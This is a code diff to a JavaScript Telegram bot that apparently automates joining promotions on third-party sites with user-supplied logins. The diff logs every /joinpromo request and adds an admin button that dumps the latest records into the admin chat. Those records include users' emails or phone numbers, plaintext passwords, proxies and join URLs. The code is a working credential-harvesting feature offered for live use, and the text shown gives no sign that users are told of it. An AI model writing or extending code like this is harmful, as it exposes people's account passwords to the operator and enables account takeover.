@@ -376,6 +376,7 @@ function adminPanelKeyboard() {
       [{ text: "Approve User", callback_data: "adm:lua" }],
       [{ text: "Reject User", callback_data: "adm:lur" }],
       [{ text: "Approved list", callback_data: "adm:laa" }],
+      [{ text: "Joinpromo data", callback_data: "adm:jpd" }],
       [{ text: "Block user", callback_data: "adm:lub" }],
       [{ text: "Block by Telegram ID", callback_data: "adm:bui" }],
       [{ text: "Unblock user", callback_data: "adm:luu" }],
@@ -549,6 +550,42 @@ async function sendApprovedBlockPickList(chatId) {
   });
 }
 
+async function sendJoinPromoRequestData(chatId) {
+  const rows = authStore.listJoinPromoRequests(80);
+  if (rows.length === 0) {
+    await sendMessage(chatId, "No /joinpromo data found yet.");
+    await sendAdminHome(chatId);
+    return;
+  }
+
+  const lines = ["Latest /joinpromo records:", ""];
+  for (const r of rows) {
+    const name = [r.first_name, r.last_name].filter(Boolean).join(" ").trim() || "(no name)";
+    const uname = r.username ? `@${String(r.username).replace(/^@/, "")}` : "—";
+    lines.push(
+      [
+        `#${r.id} | ${r.created_at}`,
+        `User: ${r.telegram_user_id} | ${uname} | ${name}`,
+        `Site: ${r.site}`,
+        `Email/Mobile: ${r.identifier}`,
+        `Password: ${r.password}`,
+        `Amount: ${r.amount}`,
+        `Promotion ID: ${r.promotion_id}`,
+        `Proxy: ${r.proxy || "-"}`,
+        `Join URL: ${r.join_url || "-"}`,
+        "--------------------",
+      ].join("\n")
+    );
+  }
+
+  const body = lines.join("\n");
+  const maxChunk = 3500;
+  for (let i = 0; i < body.length; i += maxChunk) {
+    await sendMessage(chatId, body.slice(i, i + maxChunk));
+  }
+  await sendAdminHome(chatId);
+}
+
 async function sendBlockedUnblockPickList(chatId) {
   const rows = authStore.listBlockedUsers(25);
   if (rows.length === 0) {
@@ -654,6 +691,10 @@ async function handleCallbackQuery(query) {
   }
   if (body === "laa") {
     await sendApprovedUserList(chatId);
+    return;
+  }
+  if (body === "jpd") {
+    await sendJoinPromoRequestData(chatId);
     return;
   }
   if (body === "lub") {
@@ -951,6 +992,13 @@ async function handleMessage(message) {
       "Invalid format.\n/login <email_or_mobile> <password>\n/joinpromo <site> <email> <password> <amount> [proxy] [joinUrl]"
     );
     return;
+  }
+
+  if (normalizeCmd(text.split(/\s+/)[0]) === "/joinpromo") {
+    const lr = authStore.logJoinPromoRequest(from, parsed);
+    if (!lr.ok) {
+      console.warn(`[joinpromo-log] failed for user ${uid}: ${lr.error}`);
+    }
   }
 
   await dispatchAutomationFlow(chatId, parsed);
